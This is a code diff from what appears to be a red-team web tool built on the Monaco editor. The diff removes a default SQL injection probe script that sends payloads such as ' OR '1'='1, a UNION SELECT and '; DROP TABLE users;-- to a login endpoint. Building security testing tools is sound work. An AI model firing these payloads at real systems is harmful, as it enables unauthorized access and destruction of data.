@@ -6,26 +6,6 @@ import Editor from "@monaco-editor/react";
 // Default attack script (JS) – returns structured JSON with http log
 const defaultAttack = `// Red script: SQLi probe
 // attack(target) receives { url } and http with get/post returning { status, body }
-export async function attack(target, http) {
-  const payloads = ["' OR '1'='1", "' UNION SELECT null--", "'; DROP TABLE users;--"];
-  const httpLog = [];
-
-  const pushLog = (method, path, status) => httpLog.push({ method, path, status });
-
-  for (const p of payloads) {
-    const path = "/login?u=admin&p=" + encodeURIComponent(p);
-    const url = target.url.replace(/\\/$/, "") + path;
-    const res = await http.get(url);
-    pushLog("GET", path, res.status);
-
-    const bodyLower = String(res.body || "").toLowerCase();
-    if (res.status === 500 || bodyLower.includes("sql")) {
-      return { finding: "Possible SQLi", payload: p, http: httpLog };
-    }
-  }
-
-  return { finding: "No obvious SQLi", http: httpLog };
-}
 `;
 
 const API_BASE = "http://localhost:3001";
